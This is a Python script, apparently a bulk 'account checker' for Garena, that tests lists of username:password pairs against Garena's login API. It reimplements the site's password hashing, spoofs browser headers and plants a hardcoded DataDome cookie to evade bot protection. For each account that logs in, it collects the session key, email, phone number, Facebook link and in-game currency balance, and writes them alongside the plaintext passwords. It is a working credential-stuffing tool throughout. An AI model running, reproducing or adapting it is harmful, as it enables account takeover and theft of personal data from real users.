import requests
import json
import random
import hashlib
import os
import time
from tqdm import tqdm
from colorama import Fore, Style, init
from datetime import datetime
import logging
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Initialize colorama
init(autoreset=True)

# Set up logging configuration
def setup_logging():
    # Create logs directory if it doesn't exist
    os.makedirs("logs", exist_ok=True)
    
    # Create log filename with timestamp
    log_filename = os.path.join("logs", f"account_checker_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
    
    # Create formatter for file logging
    file_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    
    # Create formatter for console logging (minimal)
    console_formatter = logging.Formatter('%(message)s')
    
    # Create file handler
    file_handler = logging.FileHandler(log_filename, encoding='utf-8')
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(file_formatter)
    
    # Create console handler
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.INFO)
    console_handler.setFormatter(console_formatter)
    
    # Get the root logger
    logger = logging.getLogger()
    logger.setLevel(logging.DEBUG)
    
    # Remove any existing handlers
    for handler in logger.handlers[:]:
        logger.removeHandler(handler)
    
    # Add handlers to logger
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)
    
    # Log initial message to verify logging is working
    logging.debug("="*50)
    logging.debug("Logging initialized")
    logging.debug(f"Log file: {log_filename}")
    logging.debug("="*50)
    
    return log_filename

def generate_md5_hash(password):
    """
    Generate the MD5 hash for a given password.
    """
    md5_hash = hashlib.md5()
    md5_hash.update(password.encode('utf-8'))
    return md5_hash.hexdigest()

def microtime_float():
    """
    Get the current time in milliseconds.
    """
    return int(round(time.time() * 1000))

def encode_password(password, v1, v2):
    """
    Encode the password using v1 and v2 values from prelogin response.
    The process is:
    1. MD5 hash the password
    2. Combine with v1 and hash twice with SHA256
    3. Use result as key for AES-256-ECB encryption
    """
    # Log input values
    logging.debug(f"Password: {password}")
    logging.debug(f"v1: {v1}")
    logging.debug(f"v2: {v2}")
    
    # Step 1: MD5 hash the password
    passmd5 = hashlib.md5(password.encode('utf-8')).hexdigest()
    logging.debug(f"MD5 hash: {passmd5}")
    
    # Step 2: Combine with v1 and hash twice with SHA256
    first_hash = hashlib.sha256((passmd5 + v1).encode('utf-8')).hexdigest()
    logging.debug(f"First SHA256: {first_hash}")
    
    second_hash = hashlib.sha256((first_hash + v2).encode('utf-8')).hexdigest()
    logging.debug(f"Second SHA256: {second_hash}")
    
    # Step 3: Use result as key for AES-256-ECB encryption
    # Convert hex strings to bytes
    key = bytes.fromhex(second_hash)
    plaintext = bytes.fromhex(passmd5)
    
    # Create AES cipher
    cipher = AES.new(key, AES.MODE_ECB)
    
    # Encrypt and convert to hex
    encrypted = cipher.encrypt(pad(plaintext, AES.block_size))
    final_hash = encrypted.hex()[:32]  # Take first 32 characters
    
    logging.debug(f"Final hash: {final_hash}")
    return final_hash

def get_captcha():
    """
    Fetch a captcha image and return its key and a dummy captcha code.
    """
    keycap = hashlib.md5(str(random.random()).encode()).hexdigest()

    # Ensure the captcha directory exists
    os.makedirs("captcha", exist_ok=True)

    captcha_url = f"https://gop.captcha.garena.com/image?key={keycap}"
    captcha_image = requests.get(captcha_url).content
    with open(f"captcha/{keycap}.png", 'wb') as f:
        f.write(captcha_image)

    captcha_code = "dummy_captcha_code"
    return keycap, captcha_code

def login_and_get_session(username, password):
    """
    Perform login and return session cookies.
    """
    try:
        response = requests.post('https://sso.garena.com/api/login', data={'username': username, 'password': password})
        
        # Log all cookies set by the server after login
        print("Cookies after login:", response.cookies.get_dict())
        
        if response.status_code == 200:
            return response.cookies
        else:
            print(f"Login failed: {response.status_code} - {response.text}")
            return None
    except Exception as e:
        print(f"An error occurred during login: {str(e)}")
        return None

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def get_user_info(cookies, username):
    """
    Fetch user information using the session cookies.
    """
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Referer': 'https://account.garena.com/',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    # Debugging: Print cookies being sent
    print(f"Getting user info with cookies: {cookies}")
    
    response = requests.get("https://account.garena.com/api/account/init", cookies=cookies, headers=headers)

    if response.status_code == 200:
        return response.json()
    else:
        if response.status_code == 401 and "error_session" in response.text:
            return {"error": "Session expired or invalid. Please re-login."}
        return {"error": f"Failed to retrieve user info. Status Code: {response.status_code}"}

def check_account(username, password):
    """
    Check the status of a given account by attempting to log in and fetch user info.
    """
    try:
        logging.debug(f"Starting check for account: {username}")
        # Use the exact same ID from successful login
        randomNum = "1746672543827"

        # Common headers for all requests
        common_headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.9',
            'connection': 'keep-alive',
            'sec-ch-ua': '"Chromium";v="136", "Brave";v="136", "Not.A/Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }

        # Initialize session to maintain cookies
        session = requests.Session()

        # Step 0: Initial universal login request
        logging.debug("Making initial universal login request")
        universal_url = "https://sso.garena.com/api/universal/login"
        universal_params = {
            "app_id": "10100",
            "redirect_uri": "https://account.garena.com/",
            "locale": "en-PH",
            "format": "json",
            "id": randomNum
        }
        
        universal_headers = common_headers.copy()
        universal_headers.update({
            'host': 'sso.garena.com',
            'referer': 'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH'
        })

        response = session.get(universal_url, params=universal_params, headers=universal_headers, timeout=10)
        logging.debug(f"Universal login response: {response.text}")
        
        # Get DataDome client key from response
        universal_data = response.json()
        datadome_client_key = universal_data.get('datadome_client_key')
        if not datadome_client_key:
            logging.debug("Failed to get DataDome client key")
            return f"[FAILED] {username}:{password} - No DataDome key"

        # Step 1: First DataDome Protection
        logging.debug("Handling first DataDome protection")
        datadome_headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://sso.garena.com',
            'referer': 'https://sso.garena.com/',
            'sec-ch-ua': '"Chromium";v="136", "Brave";v="136", "Not.A/Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }

        # Add initial datadome cookie
        session.cookies.set('datadome', 'OKdxfuxqQwRObQQJyrl_faDSz1~cipak_tDkUL9W8HS2ltj2Jirufrg_gyrf1u2IARgPlSNhn9OEBRQlL~neIsoV3K2UXfbztYHuhvA7e4LKj7z2Y2Axhoxbu7PVs1fu', domain='.garena.com', path='/')

        datadome_response = session.post(
            'https://dd.garena.com/js/',
            headers=datadome_headers,
            timeout=10
        )
        logging.debug(f"First DataDome response status: {datadome_response.status_code}")

        # Step 2: Second DataDome Protection
        logging.debug("Handling second DataDome protection")
        datadome_response = session.post(
            'https://dd.garena.com/js/',
            headers=datadome_headers,
            timeout=10
        )
        logging.debug(f"Second DataDome response status: {datadome_response.status_code}")

        # Step 3: Prelogin
        logging.debug(f"Attempting prelogin for {username}")
        prelogin_url = "https://sso.garena.com/api/prelogin"
        prelogin_headers = common_headers.copy()
        prelogin_headers.update({
            'host': 'sso.garena.com',
            'referer': 'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH',
            'x-requested-with': 'XMLHttpRequest'
        })
        
        prelogin_params = {
            "app_id": "10100",
            "account": username,
            "format": "json",
            "id": randomNum
        }
        
        response = session.get(prelogin_url, params=prelogin_params, headers=prelogin_headers, timeout=10)
        logging.debug(f"Prelogin response: {response.text}")

        # Check for captcha requirement
        prelogin_data = response.json()
        if "url" in prelogin_data:
            logging.debug(f"CAPTCHA required for account: {username}")
            return f"[FAILED] {username}:{password} - CAPTCHA required"

        # Step 4: Login
        logging.debug(f"Attempting login for {username}")
        login_url = "https://sso.garena.com/api/login"
        
        # Generate password hash using actual v1 and v2 values
        final_hash = encode_password(password, prelogin_data.get('v1', ''), prelogin_data.get('v2', ''))
        logging.debug(f"Generated hash: {final_hash}")
        
        login_headers = common_headers.copy()
        login_headers.update({
            'host': 'sso.garena.com',
            'referer': 'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH',
            'x-requested-with': 'XMLHttpRequest'
        })
        
        login_params = {
            'app_id': '10100',
            'account': username,
            'password': final_hash,
            'redirect_uri': 'https://account.garena.com/',
            'format': 'json',
            'id': randomNum
        }
        
        response = session.get(login_url, params=login_params, headers=login_headers, timeout=10)
        logging.debug(f"Login response: {response.text}")

        if response.status_code == 200:
            data = response.json()
            
            if "error" in data:
                error_msg = data.get('error', 'Unknown error')
                logging.debug(f"Login failed for {username}: {error_msg}")
                return (
                    f"❌ Account Check Failed\n"
                    f"    Login: {username}:{password}\n"
                    f"    Error Details:\n"
                    f"    Type: Authentication Error\n"
                    f"    Message: {error_msg}\n"
                    f"\n--------------------------------------------------------------------------------\n"
                )
            
            # Get the sso_key cookie
            sso_key = session.cookies.get('sso_key')
            if not sso_key:
                logging.debug(f"No sso_key cookie received for {username}")
                return (
                    f"❌ Account Check Failed\n"
                    f"    Login: {username}:{password}\n"
                    f"    Error Details:\n"
                    f"    Type: Session Error\n"
                    f"    Message: No session key received\n"
                    f"\n--------------------------------------------------------------------------------\n"
                )
            
            logging.debug(f"Login successful for {username}")
            logging.debug(f"Session key: {sso_key}")

            # Step 5: Get account info
            account_headers = common_headers.copy()
            account_headers.update({
                'accept': '*/*',
                'host': 'account.garena.com',
                'referer': 'https://account.garena.com/',
                'x-requested-with': 'XMLHttpRequest'
            })
            
            # Add session key to URL
            account_url = f"https://account.garena.com/?session_key={sso_key}"
            account_response = session.get(account_url, headers=account_headers, timeout=10)
            
            if account_response.status_code == 200:
                logging.debug(f"Successfully retrieved account info for {username}")
                
                # Get additional account info
                account_info_url = "https://account.garena.com/api/account/init"
                account_info_response = session.get(account_info_url, headers=account_headers, timeout=10)
                logging.debug(f"Account info response: {account_info_response.text}")
                
                account_info = account_info_response.json() if account_info_response.status_code == 200 else {}
                
                # Extract user information from login response and account info
                user_info = {
                    'username': data.get('username', ''),
                    'uid': data.get('uid', ''),
                    'timestamp': data.get('timestamp', ''),
                    'session_key': data.get('session_key', ''),
                    'acc_country': account_info.get('user_info', {}).get('acc_country', ''),
                    'email': account_info.get('user_info', {}).get('email', ''),
                    'fb_account': account_info.get('user_info', {}).get('fb_account', ''),
                    'mobile_no': account_info.get('user_info', {}).get('mobile_no', ''),
                    'nickname': account_info.get('user_info', {}).get('nickname', ''),
                    'shell': account_info.get('user_info', {}).get('shell', ''),
                    'signature': account_info.get('user_info', {}).get('signature', ''),
                    'avatar': account_info.get('user_info', {}).get('avatar', '')
                }

                # Get games from game_otp_configs
                games = []
                game_configs = account_info.get('game_otp_configs', {})
                for region, region_games in game_configs.items():
                    for game_id, game_info in region_games.items():
                        game_name = game_info.get('name', '')
                        if game_name and game_name not in games:
                            games.append(game_name)
                
                # Format the success message with clean formatting
                success_msg = (
                    f"✅ Account Check Success\n"
                    f"    Login: {username}:{password}\n"
                    f"    UID: {user_info['uid']}\n"
                    f"    Username: {user_info['username']}\n"
                    f"    Session: {user_info['session_key']}\n"
                    f"    Country: {user_info['acc_country']}\n"
                    f"    Email: {user_info['email']}\n"
                    f"    Mobile: {user_info['mobile_no'] if user_info['mobile_no'] else 'Not Set'}\n"
                    f"    Facebook: {user_info['fb_account'] if user_info['fb_account'] else 'Not Connected'}\n"
                    f"    Nickname: {user_info['nickname'] if user_info['nickname'] else 'Not Set'}\n"
                    f"    Shell: {user_info['shell']}\n"
                    f"    Signature: {user_info['signature'] if user_info['signature'] else 'Not Set'}\n"
                    f"\n--------------------------------------------------------------------------------\n"
                )
                
                return success_msg
            else:
                logging.debug(f"Failed to get account info for {username}: {account_response.status_code}")
                error_msg = (
                    f"❌ Account Check Failed\n"
                    f"    Error Details:\n"
                    f"    Type: Account info error\n"
                    f"    Status: {account_response.status_code}\n"
                    f"\n--------------------------------------------------------------------------------\n"
                )
                return error_msg

        else:
            logging.debug(f"HTTP error {response.status_code} for {username}")
            error_msg = (
                f"❌ Account Check Failed\n"
                f"    Error Details:\n"
                f"    Type: HTTP Error\n"
                f"    Status: {response.status_code}\n"
                f"\n--------------------------------------------------------------------------------\n"
            )
            return error_msg

    except Exception as e:
        logging.debug(f"Exception occurred while checking {username}: {str(e)}", exc_info=True)
        error_msg = (
            f"❌ Account Check Failed\n"
            f"    Error Details:\n"
            f"    Type: Exception\n"
            f"    Message: {str(e)}\n"
            f"\n--------------------------------------------------------------------------------\n"
        )
        return error_msg

def bulk_check(input_file, output_file):
    """
    Perform bulk account checking using an input file and save results to an output file.
    """
    successful_count = 0
    failed_count = 0

    logging.debug(f"Starting bulk check with input file: {input_file}")
    logging.debug(f"Results will be saved to: {output_file}")

    try:
        # Open files with UTF-8 encoding
        with open(input_file, 'r', encoding='utf-8') as infile, open(output_file, 'w', encoding='utf-8') as outfile:
            # Filter out empty lines and strip whitespace
            accounts = [line.strip() for line in infile.readlines() if line.strip()]
            total_accounts = len(accounts)
            logging.debug(f"Found {total_accounts} valid accounts to check")

            # Create progress bar with position=0 to ensure it stays at the top
            pbar = tqdm(accounts, desc=f"{Fore.CYAN}Checking{Style.RESET_ALL}", unit="acc", position=0, leave=True)
            
            for acc in pbar:
                if ':' in acc:
                    username, password = acc.split(':', 1)  # Split only on first colon
                    logging.debug(f"Processing account: {username}")
                    result = check_account(username, password)
                    outfile.write(result + '\n')
                    outfile.flush()  # Ensure immediate write to file

                    if "✅" in result:  # Check for success emoji
                        successful_count += 1
                        logging.debug(f"Account {username} check successful")
                    else:
                        failed_count += 1
                        logging.debug(f"Account {username} check failed")
                else:
                    error_msg = f"⚠️ Invalid format: {acc}"
                    logging.debug(error_msg)
                    outfile.write(error_msg + '\n')
                    outfile.flush()  # Ensure immediate write to file
                    failed_count += 1

                time.sleep(1)
            
            # Clear the progress bar
            pbar.close()
            
            # Show the final summary with colors
            print(f"\n{Fore.GREEN}Success: {successful_count}{Style.RESET_ALL} | {Fore.RED}Failed: {failed_count}{Style.RESET_ALL}")

        summary = f"\nTotal Successful: {successful_count}\nTotal Failed: {failed_count}"
        logging.debug(summary)
        
    except UnicodeEncodeError as e:
        print(f"{Fore.RED}Error: Unable to write to output file. Please ensure the file path is valid and you have write permissions.{Style.RESET_ALL}")
        logging.error(f"UnicodeEncodeError: {str(e)}")
    except Exception as e:
        print(f"{Fore.RED}Error: An unexpected error occurred: {str(e)}{Style.RESET_ALL}")
        logging.error(f"Unexpected error: {str(e)}", exc_info=True)

def display_banner():
    """
    Display the program banner.
    """
    banner = f"""{Fore.RED}
   ___ _               _
  / __\ |__   ___  ___| | _____ _ __
 / /  | '_ \ / _ \/ __| |/ / _ \ '__|
/ /___| | | |  __/ (__|   <  __/ |
\____/|_| |_|\___|\___|_|\_\___|_|

    ___
   / _ \__ _ _ __ ___ _ __   __ _
  / /_\/ _` | '__/ _ \ '_ \ / _` |
 / /_/\ (_| | | |  __/ | | | (_| |
 \____/\__,_|_|  \___|_| |_|\__,_|
    {Fore.YELLOW}Author @Krukru{Style.RESET_ALL}
    """
    print(banner)

if __name__ == "__main__":
    try:
        log_filename = setup_logging()
        logging.debug("Starting Account Checker")
        
        display_banner()
        logging.debug("Displayed program banner")

        input_file = input(f"{Fore.MAGENTA}ᴇɴᴛᴇʀ Fɪʟᴇɴᴀᴍᴇ ᴡɪʟʟ ᴄʜᴇᴄᴋ: {Style.RESET_ALL}")
        output_file = input(f"{Fore.MAGENTA}ᴇɴᴛᴇʀ Fɪʟᴇɴᴀᴍᴇ ᴛᴏ ꜱᴀᴠᴇ ɪᴛ: {Style.RESET_ALL}")
        
        logging.debug(f"Input file: {input_file}")
        logging.debug(f"Output file: {output_file}")

        bulk_check(input_file, output_file)
        logging.debug(f"Program completed. Log file: {log_filename}")
    except Exception as e:
        logging.debug(f"Critical error occurred: {str(e)}", exc_info=True)
        print(f"{Fore.RED}An error occurred: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)